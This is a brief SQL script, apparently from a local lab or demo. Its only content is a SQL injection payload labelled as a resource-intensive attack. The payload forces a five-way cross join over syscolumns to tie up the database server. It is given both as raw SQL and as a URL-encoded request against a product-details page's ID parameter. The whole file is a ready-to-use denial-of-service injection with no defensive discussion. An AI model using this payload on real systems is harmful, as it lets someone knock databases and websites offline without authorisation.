-----------------------------------------------------------------------------------
-- == CREATE A RESOURCE INTENSIVE ATTACK == 
-----------------------------------------------------------------------------------

-- create a long running query / attack
SELECT * from DimProduct where ProductKey=603 	
 and (1	< (select case when	1=1	then (select CHECKSUM_AGG(c1.id) from syscolumns c1, syscolumns c2, syscolumns c3, syscolumns c4, syscolumns c5 where c1.id=c2.id and c2.id=c3.id and c4.id=c3.id and c5.id=c4.id) else 0 end)) and '1'='1' --

http://localhost/htm/product-details.php?ID=603and%20(1%20%3C%20(select%20case%20when%201=1%20then%20(select%20CHECKSUM_AGG(c1.id)%20from%20syscolumns%20c1,%20syscolumns%20c2,%20syscolumns%20c3,%20syscolumns%20c4,%20syscolumns%20c5%20where%20c1.id=c2.id%20and%20c2.id=c3.id%20and%20c4.id=c3.id%20and%20c5.id=c4.id)%20else%200%20end))%20and%20%271%27=%271%27%20--
